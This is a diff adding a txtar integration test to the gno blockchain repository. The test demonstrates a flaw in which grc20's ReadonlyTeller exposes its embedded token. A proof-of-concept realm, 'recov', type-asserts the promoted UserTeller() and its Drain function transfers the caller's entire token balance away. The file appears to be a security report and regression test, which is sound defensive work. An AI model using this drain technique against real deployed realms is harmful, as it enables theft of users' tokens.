@@ -1,0 +1,99 @@
+# ReadonlyTeller is documented as a teller that panics for any write, so a token
+# realm that keeps its *Token unexported can hand one out. *fnTeller embeds
+# *Token, so the recipient asserts the promoted UserTeller() off the readonly
+# value and gets a live user-spend capability over anyone who calls it directly.
+# Measured at 16f54a89c: privtok never exports its *Token and never registers,
+# and alice's 1000000 PRIV still leaves for the recipient realm.
+#
+# Run: from a local clone of gnolang/gno:
+# gh pr checkout 6123 -R gnolang/gno
+# cp grc20_readonly_teller_promotes_token.txtar gno.land/pkg/integration/testdata/
+# go test -v -run 'TestTestdata/grc20_readonly_teller_promotes_token' ./gno.land/pkg/integration/
+# rm gno.land/pkg/integration/testdata/grc20_readonly_teller_promotes_token.txtar
+
+loadpkg gno.land/p/demo/tokens/grc20
+loadpkg gno.land/r/test/privtok $WORK/privtok
+loadpkg gno.land/r/test/recov $WORK/recov
+
+adduser alice
+
+gnoland start
+
+gnokey maketx send -send 50000000ugnot -to $alice_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid tendermint_test test1
+stdout 'OK!'
+
+gnokey maketx call -pkgpath gno.land/r/test/privtok -func Faucet -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
+stdout OK
+gnokey query vm/qeval --data "gno.land/r/test/privtok.BalanceOf(\"$alice_user_addr\")"
+stdout '1000000 int64'
+
+gnokey maketx call -pkgpath gno.land/r/test/recov -func Drain -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
+stdout OK
+
+gnokey query vm/qeval --data "gno.land/r/test/privtok.BalanceOf(\"$alice_user_addr\")"
+stdout '0 int64'         # IS:     a readonly teller yields the token, and the token yields a user teller
+# stdout '1000000 int64' # SHOULD: a readonly teller carries no write capability
+
+-- privtok/gnomod.toml --
+module = "gno.land/r/test/privtok"
+gno = "0.9"
+
+-- privtok/privtok.gno --
+package privtok
+
+import "gno.land/p/demo/tokens/grc20"
+
+// token stays unexported and the realm never registers it, so no other realm
+// can reach a *Token pointer through an exported var or the registry.
+var (
+	token *grc20.Token
+	adm   *grc20.PrivateLedger
+)
+
+func init(cur realm) {
+	token, adm = grc20.NewToken("PrivTok", "PRIV", 4, 0, cur)
+}
+
+func Faucet(cur realm) {
+	if err := adm.Mint(cur.Previous().Address(), 1_000_000); err != nil {
+		panic(err)
+	}
+}
+
+// Readonly publishes the teller the package documents as write-proof.
+func Readonly() grc20.Teller { return token.ReadonlyTeller() }
+
+func BalanceOf(owner address) int64 { return token.BalanceOf(owner) }
+
+-- recov/gnomod.toml --
+module = "gno.land/r/test/recov"
+gno = "0.9"
+
+-- recov/recov.gno --
+package recov
+
+import (
+	"gno.land/p/demo/tokens/grc20"
+	"gno.land/r/test/privtok"
+)
+
+// tokenish is the method set *fnTeller promotes from its embedded *Token.
+type tokenish interface {
+	UserTeller() grc20.Teller
+}
+
+func Drain(cur realm) {
+	ro := privtok.Readonly()
+	g, ok := ro.(tokenish)
+	if !ok {
+		panic("no promotion")
+	}
+	victim := cur.Previous().Address()
+	bal := ro.BalanceOf(victim)
+	if bal == 0 {
+		panic("victim holds nothing")
+	}
+	if err := g.UserTeller().Transfer(0, cur, cur.Address(), bal); err != nil {
+		panic(err)
+	}
+}
